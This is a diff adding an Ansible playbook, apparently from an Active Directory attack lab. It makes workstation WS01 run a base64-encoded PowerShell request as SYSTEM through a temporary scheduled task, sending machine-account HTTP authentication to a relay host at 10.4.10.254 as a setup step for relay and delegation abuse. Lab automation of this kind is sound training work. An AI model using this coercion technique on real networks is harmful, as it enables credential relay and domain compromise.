@@ -1,0 +1,39 @@
+---
+- name: Trigger deterministic WS01 machine-account HTTP authentication for Phase 03
+  hosts: ws01
+  gather_facts: false
+  tasks:
+    - name: Run one HTTP request as LocalSystem and remove the temporary task
+      ansible.windows.win_powershell:
+        script: |
+          $ErrorActionPreference = 'Stop'
+          $Ansible.Changed = $false
+
+          $taskName = 'Kingdoms-Phase03-System-HTTP'
+          $uri = 'http://10.4.10.254/phase03-rbcd-system'
+
+          $payload = @"
+          `$ProgressPreference = 'SilentlyContinue'
+          try {
+              Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials -Uri '$uri' -TimeoutSec 15 | Out-Null
+          } catch {
+              # A relay server may intentionally terminate or redirect the HTTP exchange.
+          }
+          "@
+
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+          $exe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+          $action = New-ScheduledTaskAction -Execute $exe -Argument "-NoProfile -NonInteractive -EncodedCommand $encoded"
+          $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+
+          try {
+              Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+              Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal | Out-Null
+              Start-ScheduledTask -TaskName $taskName
+              Start-Sleep -Seconds 8
+              Write-Output 'PHASE03_SYSTEM_HTTP_TRIGGERED=True'
+              Write-Output "PHASE03_SYSTEM_HTTP_URI=$uri"
+              Write-Output 'PHASE03_SYSTEM_HTTP_IDENTITY=LocalSystem'
+          } finally {
+              Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+          }
